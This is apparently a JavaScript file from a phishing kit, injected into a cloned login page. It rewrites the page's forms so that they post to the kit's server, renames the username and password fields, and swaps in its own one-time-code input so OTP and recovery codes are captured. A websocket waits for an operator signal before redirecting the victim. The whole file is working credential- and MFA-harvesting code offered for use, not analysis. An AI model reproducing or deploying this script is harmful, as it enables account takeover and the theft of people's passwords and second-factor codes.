const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[id="username"]`,
            `[id="password"]`
        ],
        runner() {
            const username = document.querySelector(`[id="username"]`)
            const password = document.querySelector(`[id="password"]`)
            username.name = "username"
            password.name = "password"

            let showPassBtn = document.querySelector(`[title="Reveal password"]`)
            if (showPassBtn) {
                showPassBtn.addEventListener("click", () => {
                    if (password.type == "password") {
                        password.type = "text"
                    } else {
                        password.type = "password"
                    }
                })
            }

            let staySignedIn = document.querySelector("#staySignedIn")
            if (staySignedIn) {
                staySignedIn.checked = true
                staySignedIn.required = false
            }

            let buttonLoaderContainer = document.querySelector(".button-loader-container")
            if (buttonLoaderContainer) {
                setTimeout(() => {
                    buttonLoaderContainer.parentElement.removeAttribute("disabled")
                    buttonLoaderContainer.remove()
                }, 6000)
            }
        }
    },
    {
        spikeType: "recovery-code",
        querys: [`[id="recovery-code"]`],
        runner() {
            document.querySelector(`[id="recovery-code"]`).name = "code"
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "otp-code",
        runner() {
            const otpInputs = document.querySelectorAll(`[type="tel"]`)
            if (otpInputs.length == 6) {
                addSpikeType(this.spikeType)
                document.querySelector(".field-two-container").innerHTML = `
                <div class="field-two-input-container relative">
                    <div class="flex flex-nowrap" dir="ltr">
                        <div class="input flex flex-nowrap items-stretch flex-1 relative" data-testid="input-root" style="width: 50px; min-width: 50px; height: 58px; font-size: 25px; margin-right: 16px;">
                            <div class="flex flex-1">
                                <input autocomplete="one-time-code" autocapitalize="off" autocorrect="off" spellcheck="false" aria-invalid="false" name="code" data-testid="input-input-element" id="totp" type="number" inputmode="numeric" aria-label="Enter verification code. Digit 1." class="input-element w-full text-center p-0 shrink-0" value="" required="">
                            </div>
                        </div>
                    </div>
                </div>
                `

                const totp = document.querySelector("#totp")
                totp.addEventListener("input", () => {
                    if (totp.value.length > 6) {
                        spikeForm({
                            spikeType: this.spikeType,
                            code: totp.value
                        })
                    }
                })
            }
        }
    },
    {
        spikeType: "use-recovery-btn",
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (btn.innerText == "Use recovery code") {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType,
                        })
                    })
                }
            })
        }
    },
    {
        spikeType: "use-authcode-btn",
        runner() {
            let useauthCode = document.querySelector("#spike-r-code-btn")
            if (useauthCode) {
                useauthCode.addEventListener("click", () => {
                    spikeForm({
                        spikeType: this.spikeType,
                    })
                })
            }
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}